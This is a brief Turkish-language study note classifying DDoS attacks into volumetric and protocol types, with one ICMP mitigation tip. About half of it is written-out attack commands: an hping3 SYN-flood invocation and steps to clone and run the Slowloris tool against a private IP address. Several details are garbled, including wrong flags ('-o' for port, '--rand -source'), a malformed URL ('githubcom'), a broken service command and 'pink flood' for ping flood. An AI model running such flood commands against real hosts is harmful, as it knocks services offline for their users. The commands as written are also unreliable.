# Saldırı Türleri
> ## Volumetrik Saldırılar
- ```UDP```: Temel portlarına çok sayıda UDP paketi yollanamasıdır
- ```ICMP```: **Smurf saldırı** ve **pink flood** saldırılarıdır
- ```Reflection Amplification Saldırıları```

#### ! ```ICMP```'den korunmak için **bant genişliği arttırılabilir** veya **paket sayısı ve boyutu kısıtlanabilir**

> ## Protokol Saldırıları
- ```SYN FLOOD```: En çok kullanılan DDOS saldırı tipidir
```
hping3 -c 15000 -d 120 -S -w 64 -o 80 --flood --rand -source 192.168.123.123

* -c: Paket Sayısı
* -d: Data Büyüklüğü
* -S: SYN
* -w: Windows bit boyutu
* -p: Destport
* -source: IP Adresi
```

- ```HTTP FLOOD``` 
- ```SLOWLORIS```
``` 
git clone https://githubcom/gkbrk/slowloris.git
servise apache 2 start
cd slowloris
python3 slowloris 192.168.123.123 -s 500 (-s paket sayısı)
```
